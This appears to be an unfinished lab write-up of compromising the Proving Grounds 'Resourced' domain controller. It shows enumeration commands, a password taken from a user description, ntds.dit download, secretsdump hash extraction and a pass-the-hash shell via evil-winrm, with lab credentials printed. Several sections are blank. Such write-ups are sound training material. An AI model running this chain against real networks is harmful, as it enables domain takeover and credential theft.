# PGP Resourced - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-6

---

## 0. Lesson Learned



---

## 1. Executive Summary



---

## 2. Scope

- **Target:** 192.168.110.175
- **Environment:** Proving Grounds Practice Resourced
- **Testing Window:** 2026-3-5 to 2026-3-6
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP port scan was conducted to identify exposed services:

```
nmap -p- -sCV 192.168.110.175 -T4 -oA resourced_tcp
```

The scan identified the following relevant services:

- 88/tcp - Kerberos
- 445/tcp - SMB
- 389/tcp - LDAP
- 3268/tcp - Global Catalog
- 3389/tcp - RDP
- 5985/tcp - WinRM

These services indicate the host is an Active Directory Domain Controller.

---

## 5. Enumeration

Anonymous SMB login was successful but no shares were exposed:

```
smbclient -L //192.168.157.175 -N
```

LDAP enumeration revealed naming contexts but failed due to authentication requirements:

```
ldapsearch -x -H ldap://192.168.157.175 -s base namingContexts

ldapsearch -x -H ldap://192.168.157.175 -b "DC=resourced,DC=local" "(objectClass=person)"
```

RPC enumeration revealed domain users and groups:

```
rpcclient -U "" -N 192.168.157.175

enumdomusers

enumdomgroups
```

Revealing multiple domain accounts including:

```
Administrator
Guest
krbtgt
m.mason
k.keen
l.livingstone
v.ventz
```

---

## 6. Initial Access

Inspecting user information for `v.ventz` revealed a password in the user description:

```
queryuser 0x453
```

Discovered credentials:

```
v.ventz : HotelCalifornia194!
```

Credentials were validated with CrackMapExec:

```
crackmapexec smb 192.168.157.175 -u v.ventz -p 'HotelCalifornia194!'
```

AS-REP roastable accounts were not identified:

```
GetNPUsers.py resourced.local/ -no-pass -dc-ip 192.168.157.175 -usersfile usernames.txt
```

Kerberoastable accounts were not identified:

```
GetUserSPNs.py resourced.local/v.ventz:HotelCalifornia194! -dc-ip 192.168.157.175 -request
```

---

## 7. Post-Exploitation

Domain relationships were enumerated with BloodHound:

```
bloodhound-python -d resourced.local -u v.ventz -p 'HotelCalifornia194!' -ns 192.168.157.175 -c All --zip
```

The analysis revealed the following privilege escalation path:

```
L.Livingstone -> Generic All -> ResourceDC -> CoerceToTGT -> Domain Admins -> Administrator
```

This indicated a Resource Based Constrained Delegation with a potential for abuse.

Listing authenticated SMB shares revealed a Password Audit share:

```
smbclient -L //192.168.110.175 -U v.ventz --password=HotelCalifornia194!
```

The share was connected to and files were downloaded:

```
smbclient //192.168.110.175/'Password Audit' -U v.ventz --password=HotelCalifornia194!

recurse ON
prompt OFF

cd "Active Directory"
mget *

cd ../registry
mget *
```

The downloads contained sensitive files and directories:

```
ntds.dit
SYSTEM
SECURITY
```

The domain password hashes were extracted:

```
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

Revealing the hashes for user L.Livingstone:

```
L.Livingstone : 19a3a7550ce8c505c2d46b5e39d6f808
```

The hashes were validated:

```
crackmapexec winrm 192.168.110.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
```

And a shell was obtained as L.Livingstone:

```
evil-winrm -i 192.168.110.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
```

---

## 8. Privilege Escalation


---

## 9. Proof of Compromise

---

## 10. Findings & Recommendations

---

## 11. Appendix
